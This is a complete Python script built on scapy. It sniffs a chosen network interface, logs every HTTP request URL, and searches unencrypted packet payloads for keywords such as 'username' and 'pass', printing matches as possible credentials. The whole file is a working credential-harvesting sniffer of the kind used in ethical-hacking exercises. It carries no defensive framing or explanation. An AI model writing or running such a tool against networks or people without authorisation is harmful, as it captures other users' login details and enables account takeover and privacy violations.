#!/usr/bin/env python3
import scapy.all as scapy
from scapy.layers import http
import optparse

def get_arguments():
    parser = optparse.OptionParser()
    parser.add_option("-i", "--interface", dest="interface", help="Specify an interface to sniff on")
    (options, arguments) = parser.parse_args()
    return options

def sniff(interface):
    scapy.sniff(iface=interface, store=False, prn=packets_sniff)

def get_url(packet):
    return packet[http.HTTPRequest].Host.decode() + packet[http.HTTPRequest].Path.decode()

def get_login_info(packet):
    if packet.haslayer(scapy.Raw):
        load = packet[scapy.Raw].load
        try:
            load_str = load.decode()
        except:
            load_str = load.decode(errors="ignore")
        keywords = ["username", "pass", "agent", "user", "e-mail", "mail"]
        for keyword in keywords:
            if keyword in load_str.lower():
                return load_str

def packets_sniff(packet):
    if packet.haslayer(http.HTTPRequest):
        url = get_url(packet)
        print("[+] HTTP Request >> " + url)
        login_info = get_login_info(packet)
        if login_info:
            print("\n\n[+] Possible username/password >> " + login_info + "\n\n")

options = get_arguments()
sniff(options.interface)
